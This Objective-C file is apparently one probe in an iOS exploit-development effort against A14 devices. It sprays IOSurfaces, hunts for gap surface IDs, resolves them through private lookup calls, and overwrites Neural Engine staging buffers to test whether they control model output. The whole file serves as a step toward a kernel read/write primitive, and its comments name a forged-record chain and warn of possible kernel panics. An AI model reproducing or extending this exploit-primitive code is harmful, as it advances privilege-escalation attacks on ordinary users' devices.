//
//  P083AneStagingHunt.m — staging hunt + injection + attribution. See header.
//
//  p082 proved (two boots): kernel sids 1..24 all fetch-resolve with y
//  fitting the exact-sum fp16 model, and 15/24 post-predict gap ids
//  resolve via IOSurfaceLookup in OUR registry (16 KB espresso staging,
//  distinct u32@0 fingerprints; an invariant 9-id foreign-miss window).
//
//  P083 answers: is that staging the VALUE SOURCE the ANE reads?
//    H. hunt: capture gap ids, lookup, fingerprint, SAVE full content.
//    I. inject: fill ALL hits with LUM1 (0x4C554D31), one predict.
//       y2 != y_gate => staging feeds the compute => per-surface
//       attribution loop (fill ONE, predict, restore) names the surface.
//       y2 == y_gate => command/program side (skip attribution).
//    J. classify: re-lookup, dump 32 bytes per hit:
//         LUM1 intact                    -> untouched by predicts
//         fp32/fp16 bits of measured y   -> output staging
//         else                           -> changed, dump for twin naming
//  PANIC POSSIBLE in I (filling ANE-mapped staging). No foreign writes:
//  only surfaces that resolve in OUR registry are touched.
//

#import "P083AneStagingHunt.h"
#import "LabDeviceProfile.h"
#import "LabLocalTime.h"
#import "P007Board.h"

#import <CoreML/CoreML.h>
#import <dlfcn.h>
#import <fcntl.h>
#import <mach/mach.h>
#import <math.h>
#import <string.h>
#import <unistd.h>

#define P083_BUILD     @"p083-staging-v1"
#define P083_MODEL_A   @"XVRC27_127in_1out"
#define P083_N_IN      127u
#define P083_N_SURF    412u
#define P083_CAP_MARK  0x53535353u
#define P083_ZERO      0x00000000u
#define P083_LUM1      0x4C554D31u   /* "LUM1" little-endian */
#define P083_REPS      20u
#define P083_ENGAGE_MS 1.0
#define P083_L_MAX     24u      /* staging lookup targets */
#define P083_L_CREATE  64u      /* creates to scan for fresh gaps */
#define P083_SNAP      (16UL << 10)  /* saved bytes per hit surface */

typedef struct __IOSurface *IOSurfaceRef;
typedef IOSurfaceRef (*p083_iosCreate_t)(CFDictionaryRef);
typedef uint32_t (*p083_iosGetID_t)(IOSurfaceRef);
typedef IOSurfaceRef (*p083_iosLookup_t)(uint32_t);
typedef void *(*p083_iosBase_t)(IOSurfaceRef);
typedef size_t (*p083_iosAllocSz_t)(IOSurfaceRef);
typedef kern_return_t (*p083_iosLock_t)(IOSurfaceRef, uint32_t, uint32_t *);

typedef struct {
    IOSurfaceRef surf;      /* borrowed (Lookup result), CFRelease'd */
    uint32_t     sid;
    size_t       allocSize;
    uint8_t     *snap;      /* full pre-fill content snapshot */
} p083_hit_t;

typedef struct {
    IOSurfaceRef surf;      /* owned, CFRelease'd at finish */
    uint32_t     sid;
    size_t       allocSize;
} p083_surf_t;

static int g_p083_fd = -1;
static NSMutableString *g_p083_buf;

static void p083_log(NSString *fmt, ...) {
    va_list ap;
    va_start(ap, fmt);
    NSString *line = [[NSString alloc] initWithFormat:fmt arguments:ap];
    va_end(ap);
    NSString *out = [line hasSuffix:@"\n"] ? line : [line stringByAppendingString:@"\n"];
    @synchronized ([P083AneStagingHunt class]) {
        if (g_p083_buf) [g_p083_buf appendString:out];
        if (g_p083_fd >= 0) {
            const char *s = out.UTF8String;
            if (s) {
                write(g_p083_fd, s, strlen(s));
                fcntl(g_p083_fd, F_FULLFSYNC);
            }
        }
    }
}

#pragma mark - IOSurface helpers (same dlsym shape as p082)

static p083_iosCreate_t  s_iosCreate;
static p083_iosGetID_t   s_iosGetID;
static p083_iosLookup_t  s_iosLookup;
static p083_iosBase_t    s_iosBase;
static p083_iosAllocSz_t s_iosAllocSz;
static p083_iosLock_t    s_iosLock;
static p083_iosLock_t    s_iosUnlock;

static BOOL p083_resolve_iosurface(void) {
    void *h = dlopen("/System/Library/Frameworks/IOSurface.framework/IOSurface", RTLD_LAZY);
    if (!h) h = dlopen("/System/Library/PrivateFrameworks/IOSurface.framework/IOSurface", RTLD_LAZY);
    if (!h) return NO;
    s_iosCreate  = (p083_iosCreate_t)dlsym(h, "IOSurfaceCreate");
    s_iosGetID   = (p083_iosGetID_t)dlsym(h, "IOSurfaceGetID");
    s_iosLookup  = (p083_iosLookup_t)dlsym(h, "IOSurfaceLookup");
    s_iosBase    = (p083_iosBase_t)dlsym(h, "IOSurfaceGetBaseAddress");
    s_iosAllocSz = (p083_iosAllocSz_t)dlsym(h, "IOSurfaceGetAllocSize");
    s_iosLock    = (p083_iosLock_t)dlsym(h, "IOSurfaceLock");
    s_iosUnlock  = (p083_iosLock_t)dlsym(h, "IOSurfaceUnlock");
    return s_iosCreate && s_iosGetID && s_iosLookup && s_iosBase && s_iosAllocSz
           && s_iosLock && s_iosUnlock;
}

static CFNumberRef p083_cfnum(uint64_t v) {
    return CFNumberCreate(kCFAllocatorDefault, kCFNumberSInt64Type, &v);
}

static IOSurfaceRef p083_surface_create(void) {
    CFNumberRef w = p083_cfnum(1), h = p083_cfnum(1);
    CFNumberRef bpe = p083_cfnum(4), fmt = p083_cfnum(0x42475241);
    const void *keys[] = { CFSTR("IOSurfaceWidth"), CFSTR("IOSurfaceHeight"),
                           CFSTR("IOSurfaceBytesPerElement"), CFSTR("IOSurfacePixelFormat") };
    const void *vals[] = { w, h, bpe, fmt };
    CFDictionaryRef props = CFDictionaryCreate(kCFAllocatorDefault, keys, vals, 4,
                                               &kCFTypeDictionaryKeyCallBacks,
                                               &kCFTypeDictionaryValueCallBacks);
    CFRelease(w); CFRelease(h); CFRelease(bpe); CFRelease(fmt);
    if (!props) return NULL;
    IOSurfaceRef s = s_iosCreate(props);
    CFRelease(props);
    return s;
}

/* fill a surface we OWN or that resolved in OUR registry */
static void p083_surface_fill_u32(IOSurfaceRef s, uint32_t pattern) {
    void *base = s_iosBase(s);
    size_t sz = s_iosAllocSz(s);
    if (!base || sz == 0 || sz > (16UL << 20)) return;
    if (s_iosLock(s, 0, NULL) != KERN_SUCCESS) return;
    uint32_t *p = (uint32_t *)base;
    for (size_t k = 0; k + 4 <= sz; k += 4) p[k / 4] = pattern;
    s_iosUnlock(s, 0, NULL);
}

static void p083_surface_fill_bytes(IOSurfaceRef s, const uint8_t *src, size_t n) {
    void *base = s_iosBase(s);
    size_t sz = s_iosAllocSz(s);
    if (!base || sz == 0 || n > sz) return;
    if (s_iosLock(s, 0, NULL) != KERN_SUCCESS) return;
    memcpy(base, src, n);
    s_iosUnlock(s, 0, NULL);
}

/* snapshot first P083_SNAP bytes (caller frees) */
static uint8_t *p083_snapshot(IOSurfaceRef s) {
    void *base = s_iosBase(s);
    size_t sz = s_iosAllocSz(s);
    if (!base || sz < P083_SNAP) return NULL;
    uint8_t *buf = malloc(P083_SNAP);
    if (!buf) return NULL;
    if (s_iosLock(s, 0, NULL) != KERN_SUCCESS) { free(buf); return NULL; }
    memcpy(buf, base, P083_SNAP);
    s_iosUnlock(s, 0, NULL);
    return buf;
}

static uint32_t p083_u32at0(IOSurfaceRef s) {
    void *base = s_iosBase(s);
    if (!base) return 0;
    return *(uint32_t *)base;
}

static void p083_dump32(IOSurfaceRef s, uint32_t sid) {
    void *base = s_iosBase(s);
    size_t sz = s_iosAllocSz(s);
    if (!base || sz < 32) {
        p083_log(@"  J sid=%u size=%zu base=%s", sid, sz, base ? "yes" : "no");
        return;
    }
    if (s_iosLock(s, 0, NULL) != KERN_SUCCESS) {
        p083_log(@"  J sid=%u LOCK FAILED", sid);
        return;
    }
    const uint8_t *b = (const uint8_t *)base;
    s_iosUnlock(s, 0, NULL);
    p083_log(@"  J sid=%u b[0..31]=%02x %02x %02x %02x %02x %02x %02x %02x"
             @" %02x %02x %02x %02x %02x %02x %02x %02x"
             @" %02x %02x %02x %02x %02x %02x %02x %02x"
             @" %02x %02x %02x %02x %02x %02x %02x %02x",
             sid, b[0], b[1], b[2], b[3], b[4], b[5], b[6], b[7],
             b[8], b[9], b[10], b[11], b[12], b[13], b[14], b[15],
             b[16], b[17], b[18], b[19], b[20], b[21], b[22], b[23],
             b[24], b[25], b[26], b[27], b[28], b[29], b[30], b[31]);
}

#pragma mark - CoreML (same shape as p082)

static NSURL *p083_model_url(NSString *name) {
    NSBundle *b = [NSBundle mainBundle];
    NSURL *u = [b URLForResource:name withExtension:@"mlmodelc"];
    if (u) return u;
    return [b URLForResource:name withExtension:@"mlpackage"];
}

static MLModel *p083_load(NSURL *url, MLComputeUnits units, NSError **errOut) {
    MLModelConfiguration *cfg = [[MLModelConfiguration alloc] init];
    cfg.computeUnits = units;
    return [MLModel modelWithContentsOfURL:url configuration:cfg error:errOut];
}

static MLDictionaryFeatureProvider *p083_provider_values(const double *vals, uint32_t nIn,
                                                         NSError **errOut) {
    NSMutableDictionary *features = [NSMutableDictionary dictionary];
    for (uint32_t i = 0; i < nIn; i++) {
        MLMultiArray *m = [[MLMultiArray alloc] initWithShape:@[ @1 ]
                                                   dataType:MLMultiArrayDataTypeDouble
                                                      error:nil];
        if (!m) return nil;
        m[0] = @(vals[i]);
        features[[NSString stringWithFormat:@"x_%03u", i]] =
            [MLFeatureValue featureValueWithMultiArray:m];
    }
    return [[MLDictionaryFeatureProvider alloc] initWithDictionary:features error:errOut];
}

static double p083_predict(MLModel *model, MLDictionaryFeatureProvider *fp,
                           NSTimeInterval *dur, NSError **errOut) {
    CFAbsoluteTime t0 = CFAbsoluteTimeGetCurrent();
    id<MLFeatureProvider> pred = [model predictionFromFeatures:fp error:errOut];
    CFAbsoluteTime t1 = CFAbsoluteTimeGetCurrent();
    *dur = t1 - t0;
    if (!pred) return NAN;
    MLFeatureValue *yv = [pred featureValueForName:@"y"];
    MLMultiArray *ya = yv.multiArrayValue;
    return ya ? ya[0].doubleValue : NAN;
}

static NSString *p083_yfmt(double y) {
    return (y == y) ? [NSString stringWithFormat:@"%.6e", y] : @"NaN";
}

static void p083_free_hits(p083_hit_t *hits, uint32_t nHits) {
    for (uint32_t i = 0; i < nHits; i++) {
        if (hits[i].surf) CFRelease(hits[i].surf);
        if (hits[i].snap) free(hits[i].snap);
    }
    free(hits);
}

static void p083_finish(uint32_t made, p083_surf_t *surfs,
                        p083_hit_t *hits, uint32_t nHits) {
    if (surfs) {
        for (uint32_t i = 0; i < made; i++) if (surfs[i].surf) CFRelease(surfs[i].surf);
        free(surfs);
    }
    if (hits) p083_free_hits(hits, nHits);
    if (g_p083_fd >= 0) { fcntl(g_p083_fd, F_FULLFSYNC); close(g_p083_fd); g_p083_fd = -1; }
}

static NSString *p083_return(void) {
    NSString *ret = g_p083_buf;
    g_p083_buf = nil;
    return ret;
}

@implementation P083AneStagingHunt

+ (NSString *)tap {
    g_p083_buf = [NSMutableString string];
    NSString *docs = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES).firstObject;
    NSString *path = [docs stringByAppendingPathComponent:@"p083_ane_staging_log.txt"];
    g_p083_fd = open(path.fileSystemRepresentation, O_CREAT | O_WRONLY | O_TRUNC, 0644);

    p083_log(@"=== p083 session %@ BUILD %@ ===", LabLocalMilitaryNow(), P083_BUILD);
    p083_log(@"p082 (2 boots): kernel sids 1..24 fetch-resolve, y fits the");
    p083_log(@"exact-sum fp16 model; 15/24 post-predict gaps resolve via");
    p083_log(@"IOSurfaceLookup in OUR registry (16 KB espresso staging, an");
    p083_log(@"invariant 9-id foreign-miss window). P083, one tap:");
    p083_log(@"  H. hunt gap ids -> lookup -> fingerprint + FULL snapshot.");
    p083_log(@"  I. fill ALL hits with LUM1 (0x4C554D31), re-predict.");
    p083_log(@"     y2 != y_gate => staging IS the value source => per-surface");
    p083_log(@"     attribution (fill ONE, predict, restore) names it.");
    p083_log(@"     y2 == y_gate => command/program side. Own writes only.");
    p083_log(@"  J. re-lookup + 32-byte dump: LUM1 intact => untouched by");
    p083_log(@"     predict; fp32/fp16 bits of y => output staging.");
    p083_log(@"PANIC POSSIBLE in I (filling ANE-mapped staging).");
    p083_log(@"%@", [P007Board shared].kreadSignal);

    NSString *stop = [LabDeviceProfile stopUnlessA14_23F77:@"p083"];
    if (stop) {
        p083_log(@"%@", stop);
        p083_finish(0, NULL, NULL, 0);
        return p083_return();
    }
    p083_log(@"%@", [LabDeviceProfile identBlock]);

    if (!p083_resolve_iosurface()) {
        p083_log(@"[-] IOSurface dlsym FAILED - abort");
        p083_log(@"=== VERDICT === abort (iosurface). hasKread=NO hasKwrite=NO.");
        p083_finish(0, NULL, NULL, 0);
        return p083_return();
    }

    /* ---- surfaces (same shape as p082: keeps live-sid sum comparable) ---- */
    p083_surf_t *surfs = calloc(P083_N_SURF, sizeof(p083_surf_t));
    uint32_t made = 0;
    uint32_t prevSid = 0;

    IOSurfaceRef first = p083_surface_create();
    if (!first) {
        p083_log(@"[-] first create FAILED - abort");
        p083_log(@"=== VERDICT === abort (first create). hasKread=NO hasKwrite=NO.");
        p083_finish(0, NULL, NULL, 0);
        return p083_return();
    }
    {
        uint32_t f0 = s_iosGetID(first);
        p083_log(@"[+] pre-consumption: first sid this boot = %u", f0);
        prevSid = f0;
        surfs[made].surf = first;
        surfs[made].sid = f0;
        surfs[made].allocSize = s_iosAllocSz(first);
        made++;
    }
    for (uint32_t i = 1; i < P083_N_SURF; i++) {
        IOSurfaceRef s = p083_surface_create();
        if (!s) continue;
        uint32_t sid = s_iosGetID(s);
        prevSid = sid;
        surfs[made].surf = s;
        surfs[made].sid = sid;
        surfs[made].allocSize = s_iosAllocSz(s);
        made++;
    }
    p083_log(@"[+] surfaces: %u/%u (ids %u..%u)", made, P083_N_SURF, surfs[0].sid, prevSid);
    if (made < P083_N_IN) {
        p083_log(@"[-] need >= %u surfaces - abort", P083_N_IN);
        p083_log(@"=== VERDICT === abort (surfaces). hasKread=NO hasKwrite=NO.");
        p083_finish(made, surfs, NULL, 0);
        return p083_return();
    }
    for (uint32_t i = 0; i < made; i++) {
        p083_surface_fill_u32(surfs[i].surf, P083_ZERO);
    }
    p083_log(@"[+] %u own surfaces staged ZERO", made);

    /* ---- load models ---- */
    NSError *err = nil;
    MLModel *modelA = p083_load(p083_model_url(P083_MODEL_A), MLComputeUnitsAll, &err);
    if (!modelA) {
        p083_log(@"[-] load A FAILED: %@", err.localizedDescription ?: @"-");
        p083_log(@"=== VERDICT === abort (load A). hasKread=NO hasKwrite=NO.");
        p083_finish(made, surfs, NULL, 0);
        return p083_return();
    }
    MLModel *modelACpu = p083_load(p083_model_url(P083_MODEL_A), MLComputeUnitsCPUOnly, &err);
    p083_log(@"[+] A loaded (All); cpuOnly twin %@", modelACpu ? @"loaded" : @"FAILED");

    /* ---- live-sid input vector (same as p082 gate) ---- */
    double sids[P083_N_IN];
    for (uint32_t i = 0; i < P083_N_IN; i++) sids[i] = (double)surfs[i].sid;
    MLDictionaryFeatureProvider *fpG = p083_provider_values(sids, P083_N_IN, &err);
    if (!fpG) {
        p083_log(@"[-] provider G FAILED - abort");
        p083_log(@"=== VERDICT === abort (provider). hasKread=NO hasKwrite=NO.");
        p083_finish(made, surfs, NULL, 0);
        return p083_return();
    }

    /* ---- PHASE G: engagement gate ---- */
    p083_log(@"--- PHASE G: engagement gate (live sids) ---");
    double yGate = NAN;
    NSTimeInterval d = 0;
    NSTimeInterval minAll = 1e9, minCpu = 1e9;
    for (uint32_t r = 0; r < P083_REPS; r++) {
        err = nil;
        yGate = p083_predict(modelA, fpG, &d, &err);
        if (d < minAll) minAll = d;
    }
    if (modelACpu) {
        for (uint32_t r = 0; r < P083_REPS; r++) {
            NSTimeInterval dc = 0;
            err = nil;
            p083_predict(modelACpu, fpG, &dc, &err);
            if (dc < minCpu) minCpu = dc;
        }
    }
    BOOL engaged = modelACpu && (minAll > minCpu + P083_ENGAGE_MS / 1000.0);
    p083_log(@"[*] GATE y=%@ minAll=%.2fms minCpu=%.2fms -> ANE %s",
             p083_yfmt(yGate), minAll * 1000.0, minCpu * 1000.0,
             engaged ? "ENGAGED" : "NOT ENGAGED");
    if (!engaged) {
        p083_log(@"=== VERDICT === ANE not engaged this boot - rerun fresh boot.");
        p083_log(@"hasKread=NO hasKwrite=NO.");
        p083_finish(made, surfs, NULL, 0);
        return p083_return();
    }

    /* ---- PHASE H: staging hunt ---- */
    p083_log(@"--- PHASE H: staging hunt (post-gate gap ids + lookup) ---");
    p083_hit_t *hits = calloc(P083_L_MAX, sizeof(p083_hit_t));
    uint32_t nHits = 0;
    {
        uint32_t gaps[P083_L_MAX];
        uint32_t nGaps = 0;
        uint32_t lPrev = prevSid;
        for (uint32_t i = 0; i < P083_L_CREATE; i++) {
            IOSurfaceRef s = p083_surface_create();
            if (!s) continue;
            uint32_t sid = s_iosGetID(s);
            if (lPrev && sid > lPrev + 1) {
                for (uint32_t g = lPrev + 1; g < sid && nGaps < P083_L_MAX; g++) {
                    gaps[nGaps++] = g;
                }
            }
            lPrev = sid;
            CFRelease(s);
        }
        p083_log(@"[+] fresh post-gate gap ids captured: %u (first %u)",
                 nGaps, nGaps ? gaps[0] : 0);

        for (uint32_t i = 0; i < nGaps; i++) {
            uint32_t g = gaps[i];
            IOSurfaceRef f = s_iosLookup(g);
            if (f) {
                p083_hit_t *hit = &hits[nHits];
                hit->surf = f;
                hit->sid = g;
                hit->allocSize = s_iosAllocSz(f);
                hit->snap = p083_snapshot(f);
                nHits++;
                p083_log(@"[*] H LOOKUP HIT sid=%u (size %zu) fp@0=%08x snap=%s",
                         g, hit->allocSize, p083_u32at0(f), hit->snap ? "yes" : "NO");
            } else {
                p083_log(@"[*] H lookup MISS sid=%u (foreign window)", g);
            }
        }
        p083_log(@"[*] H RESULT: %u hits / %u misses of %u",
                 nHits, nGaps - nHits, nGaps);
    }
    if (nHits == 0) {
        p083_log(@"[-] no staging hits - nothing to inject");
        p083_log(@"=== VERDICT === no staging in OUR registry this boot.");
        p083_log(@"hasKread=NO hasKwrite=NO.");
        p083_finish(made, surfs, hits, nHits);
        return p083_return();
    }

    /* ---- PHASE I: inject (fill ALL, predict, compare) ---- */
    p083_log(@"--- PHASE I: inject (fill ALL hits with LUM1, re-predict) ---");
    for (uint32_t i = 0; i < nHits; i++) {
        if (hits[i].surf) p083_surface_fill_u32(hits[i].surf, P083_LUM1);
    }
    p083_log(@"[+] %u staging surfaces poisoned with 0x%08x", nHits, P083_LUM1);

    err = nil;
    double y2 = p083_predict(modelA, fpG, &d, &err);
    if (err) {
        p083_log(@"[!] inject predict err=%@", err.localizedDescription ?: @"-");
        p083_log(@"[*] I RESULT: predict FAILED after fill - staging is on the");
        p083_log(@"    ANE command/program path (poison broke it). Not a y-control.");
    } else if (y2 != yGate) {
        p083_log(@"[*] I y_gate=%@ y2=%@ -> CHANGED", p083_yfmt(yGate), p083_yfmt(y2));
        p083_log(@"[*] I RESULT: STAGING IS THE VALUE SOURCE.");
        p083_log(@"    Filling espresso staging changed y => in-process y-control:");
        p083_log(@"    write staging -> control what the ANE computes and writes.");
        p083_log(@"--- PHASE I2: per-surface attribution (fill ONE, predict, restore) ---");
        for (uint32_t i = 0; i < nHits; i++) {
            if (!hits[i].surf || !hits[i].snap) continue;
            /* restore everything to pre-fill content first */
            for (uint32_t j = 0; j < nHits; j++) {
                if (hits[j].surf && hits[j].snap) {
                    p083_surface_fill_bytes(hits[j].surf, hits[j].snap, P083_SNAP);
                }
            }
            p083_surface_fill_u32(hits[i].surf, P083_LUM1);
            err = nil;
            double yi = p083_predict(modelA, fpG, &d, &err);
            p083_log(@"[*] I2 sid=%u y=%@ t=%.2fms err=%@ -> %s",
                     hits[i].sid, p083_yfmt(yi), d * 1000.0,
                     err.localizedDescription ?: @"none",
                     (err == nil && yi != yGate) ? "MOVES Y" : "no effect");
        }
        /* restore all before classify */
        for (uint32_t j = 0; j < nHits; j++) {
            if (hits[j].surf && hits[j].snap) {
                p083_surface_fill_bytes(hits[j].surf, hits[j].snap, P083_SNAP);
            }
        }
    } else {
        p083_log(@"[*] I y_gate=%@ y2=%@ -> UNCHANGED", p083_yfmt(yGate), p083_yfmt(y2));
        p083_log(@"[*] I RESULT: NO EFFECT ON Y.");
        p083_log(@"    Hits are command/program-side staging (not the value source).");
        p083_log(@"    Values flow via the record-sid fetch path (p081/p082), i.e.");
        p083_log(@"    the y-control hop stays the forged OUTPUT-record-sid route.");
    }

    /* ---- PHASE J: classify ---- */
    p083_log(@"--- PHASE J: classify (re-lookup + 32-byte dump) ---");
    {
        /* expected encodings of the measured gate y */
        float yf = (float)yGate;
        uint32_t fp32bits = 0;
        memcpy(&fp32bits, &yf, 4);
        __fp16 yh = (__fp16)yGate;
        uint16_t fp16bits = 0;
        memcpy(&fp16bits, &yh, 2);
        p083_log(@"[*] J y_gate encodings: fp32=%08x fp16=%04x",
                 fp32bits, fp16bits);
    }
    for (uint32_t i = 0; i < nHits; i++) {
        if (!hits[i].surf) continue;
        uint32_t now0 = p083_u32at0(hits[i].surf);
        const char *tag = "changed";
        if (now0 == P083_LUM1) tag = "LUM1 intact (untouched by predicts)";
        else if (hits[i].snap && now0 == *(uint32_t *)hits[i].snap) tag = "restored/original";
        p083_dump32(hits[i].surf, hits[i].sid);
        p083_log(@"  J sid=%u u32@0 now=%08x -> %s", hits[i].sid, now0, tag);
    }
    p083_log(@"    classify: y fp32/fp16 bits in dump => output staging");
    p083_log(@"              LUM1 intact => command/program side");
    p083_log(@"              other => dump for twin naming");

    /* ---- verdict ---- */
    p083_log(@"=== VERDICT ===");
    p083_log(@"Staging surfaces resolved in OUR registry were filled and");
    p083_log(@"re-predicted. The I RESULT line above is the answer:");
    p083_log(@"VALUE SOURCE => in-process y-control primitive (write staging,");
    p083_log(@"control ANE compute); NO EFFECT => command/program side and");
    p083_log(@"the y-control hop remains the Chain 2 forged output-record-sid.");
    p083_log(@"Honesty: own-registry writes + readback only, no foreign");
    p083_log(@"writes, no kernel access. Conversion bar untouched.");
    p083_log(@"hasKread=NO hasKwrite=NO. One TAP per force-quit; fresh boot next tap.");

    [[P007Board shared] recordEvent:@"p083_session" kind:@"staging_inject"
                             detail:[NSString stringWithFormat:@"hits=%u", nHits]
                             source:@"p083"];

    p083_finish(made, surfs, hits, nHits);
    return p083_return();
}

@end